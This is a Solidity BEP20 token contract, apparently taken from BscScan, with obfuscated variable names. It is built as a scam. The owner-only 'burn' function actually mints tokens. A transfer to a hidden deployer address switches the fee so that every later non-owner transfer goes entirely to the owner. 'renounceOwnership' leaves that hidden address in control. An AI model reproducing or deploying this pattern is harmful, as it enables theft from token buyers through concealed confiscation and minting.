/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-13 21:50
 */
// 
// ||||||||||||||||\                                      ||||||||||||\  ||||\                 ||||\           
// ||||  _____|                                    ||||  __||||\ |||| |                \__|          
// |||| |       ||||||||||||||\  ||||||||||||||\  ||||||||||||\        |||| /  \__|||||||||||||||\   ||||||||||||\  ||||\ ||||||||||||||\  
// ||||||||||\    ||||  _____|||||  _____|||||  __||||\       |||| |      ||||  __||||\  \____||||\ |||| |||||  __||||\ 
// ||||  __|   \||||||||||||\  \||||||||||||\  |||||||||||||||| |      |||| |      |||| |  |||| | |||||||||||||| ||||| ||||| |  |||| |
// |||| |       \____||||\  \____||||\ ||||   ____|      |||| |  ||||\ |||| |  |||| |||||  __|||| ||||| ||||| |  |||| |
// ||||||||||||||||\ ||||||||||||||  |||||||||||||||  |\||||||||||||||\       \||||||||||||  ||||| |  |||| |\|||||||||||||| ||||| ||||| |  |||| |
// \________|\_______/ \_______/  \_______|       \______/ \__|  \__| \_______|\__|\__|  \__|
//
//

pragma solidity >=0.4.11;
contract diPejZ {
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  WqOIIi = 10000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  wnbDhQ = address(0);
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  VxuCPh = address(0);
uint256 public  CUJvAc = 100000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  NaADAX = 100000000000000000000;
uint256 private  QvrYmm = 10000000000000;
uint256 public constant YSQChH = 9+1;
address public owner;
address private  qqxLry = address(0);
string public  name = "FvFgIm";
mapping (address => uint256) public balanceOf;
uint256 public  tLbktP = 10000000000000000;
uint256 public  IyhDhr = 1000000000000000000;
string public  symbol = "tppbTJ";
uint256 public  belEYm = 10000000000000000000000000000;
address public  WKeeNY = address(0);
address public  LCXieZ = address(0);
uint256 public  BCuPab = 100000000000000000000000;
address public  kGQPBN = address(0);
uint256 public  TpJWLA = 100000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  yFqXPm = address(0);
constructor () public {
qqxLry = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AuEFXy");
require(to != address(0), "AuEFXy");
require(amount <= balanceOf[from], "AuEFXy");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* YSQChH/QvrYmm ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==qqxLry){
QvrYmm = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}